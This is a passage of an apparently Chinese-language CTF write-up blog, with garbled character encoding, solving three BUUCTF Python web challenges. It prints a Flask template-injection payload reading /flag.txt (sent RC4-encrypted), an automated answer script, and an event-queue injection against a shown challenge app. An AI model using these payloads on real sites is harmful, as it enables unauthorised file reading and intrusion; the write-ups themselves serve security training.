alt=""></p><p>æ–‡ä»¶æè¿°ç¬¦ç­‰äº3å³ä¸ºflagæ–‡ä»¶</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102615.png" alt=""></p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret">CISCN2019 åä¸œå—èµ›åŒº Double Secret</h2><h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3><ul><li>æ¨¡æ¿æ³¨å…¥</li><li>RC4åŠ å¯†</li></ul><h3 id="è§£é¢˜-v9">è§£é¢˜</h3><p>æ‰«ç›®å½•å¾—åˆ°secretï¼Œè®¿é—®æç¤ºè¦æœ‰secretå‚æ•°ï¼ŒFuzzä¸€ä¸‹å‘ç°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">File &quot;&#x2F;app&#x2F;app.py&quot;, line 35, in secret</span><br><span class="line">    if(secret&#x3D;&#x3D;None):</span><br><span class="line">        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;</span><br><span class="line">    rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #è§£å¯†</span><br><span class="line">    deS&#x3D;rc.do_crypt(secret)</span><br><span class="line">    a&#x3D;render_template_string(safe(deS))</span><br><span class="line">    if &#39;ciscn&#39; in a.lower():</span><br><span class="line">        return &#39;flag detected!&#39;</span><br><span class="line">      return a</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ ä¼ å…¥äº†å‚æ•°ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šè¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯RC4åŠ å¯†ï¼Œè€Œä¸”è¿˜æ³„éœ²äº†å¯†é’¥ï¼Œå¯†é’¥å°±æ˜¯â€œHereIsTreasureâ€ï¼Œè€Œä¸”é€šè¿‡æŠ¥é”™ï¼Œæˆ‘ä»¬äº†è§£åˆ°è¿™æ˜¯flaskçš„æ¨¡æ¿ï¼Œè€Œä¸”pythonçš„ç‰ˆæœ¬æ˜¯2.7çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨flaskçš„æ¨¡æ¿æ³¨å…¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œåªä¸è¿‡éœ€è¦è¿›è¡ŒRC4åŠ å¯†ã€‚</p><p>RC4åŠ å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°åŠ å¯†åçš„payloadåä¼ å…¥ï¼Œæ‹¿åˆ°flagã€‚</p><h2 id="GXYCTF2019-Strongest-Mind">GXYCTF2019 Strongest Mind</h2><h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3><ul><li>Pythonè„šæœ¬</li></ul><h3 id="è§£é¢˜-v10">è§£é¢˜</h3><p>æ³¨æ„Sessionçš„ä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7a9216ad-bfec-45c5-a89e-71e8190e8299.node3.buuoj.cn/&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">a = s.get(url)</span><br><span class="line">pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">    c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">    print(c)</span><br><span class="line">    a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line">print(a.content)</span><br></pre></td></tr></table></figure><h2 id="DDCTF2019-homebrew-event-loop">DDCTF2019 homebrew event loop</h2><h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3><ul><li>é€»è¾‘æ¼æ´</li><li>flask session</li></ul><h3 id="è§£é¢˜-v11">è§£é¢˜</h3><p>è¯¦ç»†wpï¼š<a href="https://blog.cindemor.com/post/ctf-web-16.html">https://blog.cindemor.com/post/ctf-web-16.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5afe1f66147e857&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line"><span class="comment"># event = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=None</span>):</span></span><br><span class="line"><span class="comment"># haystack = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line"><span class="comment"># prefix = trigger_event%23;</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># event = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            <span class="comment"># action = trigger_event%23</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            <span class="comment"># args = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                <span class="comment"># event_handler = trigger_event#_handler</span></span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                <span class="comment"># ret_val = trigger_event([&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;])</span></span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.format(</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        source = open(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.format(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure><p>è¿›å…¥é˜Ÿåˆ—çš„é¡ºåºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">action:buy;5</span><br><span class="line">action:get_flag;</span><br><span class="line">func:consume_point;5</span><br><span class="line">action:view;index</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure><p>æ—¥å¿—å†™å…¥çš„é¡ºåºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">[&#39;action:buy;5&#39;,&#39;action:get_flag;&#39;]</span><br><span class="line">[&#39;func:consume_point;5&#39;,&#39;action:view;index&#39;]</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flask sessionåè§£å¯†</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200917132800.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTFåˆ·é¢˜â€”â€”Python&quot;&gt;BUUCTFåˆ·é¢˜â€”â€”Python&lt;/h1&gt;
&lt;h2 id=&quot;GYCTF2020-flaskapp&quot;&gt;GYCTF2020 flaskapp&lt;/h2&gt;
